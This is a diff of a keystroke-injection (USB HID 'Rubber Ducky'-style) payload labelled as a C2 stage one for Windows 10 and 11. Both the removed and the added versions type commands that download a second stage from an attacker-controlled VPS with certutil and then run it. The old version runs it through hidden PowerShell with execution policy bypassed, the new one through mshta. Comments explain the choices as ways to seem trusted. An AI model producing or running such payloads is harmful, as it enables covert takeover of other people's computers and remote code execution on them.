@@ -1,29 +1,11 @@
-REM XEPEL C2 – Robust Two Stage HID
-REM Entry via cmd.exe, drops to PS, fetches stage2
-REM Works Windows 10 and 11
+
+REM XEPEL C2 – HID Stage 1
+REM certutil + mshta execution chain
+REM Windows 10/11 compatible
 
 DELAY 3000
-
-REM Open Run dialog
 GUI r
-DELAY 1500
-
-REM Launch cmd.exe first - Windows trusts this
-STRING cmd
+DELAY 1200
+STRING cmd /k certutil -urlcache -split -f http://YOUR_VPS_IP/s.hta %TEMP%\s.hta & mshta %TEMP%\s.hta
 ENTER
-DELAY 2000
-
-REM Now inside cmd.exe terminal window
-REM Use certutil to download stage2 - more trusted than iwr
-STRING certutil -urlcache -split -f http://YOUR_VPS_IP/stage2.ps1 %TEMP%\s.ps1
-ENTER
-DELAY 3000
-
-REM Execute via powershell from cmd
-STRING powershell -ep bypass -w hidden -f %TEMP%\s.ps1
-ENTER
-DELAY 1000
-
-REM Close cmd window
-STRING exit
-ENTER
+DELAY 500
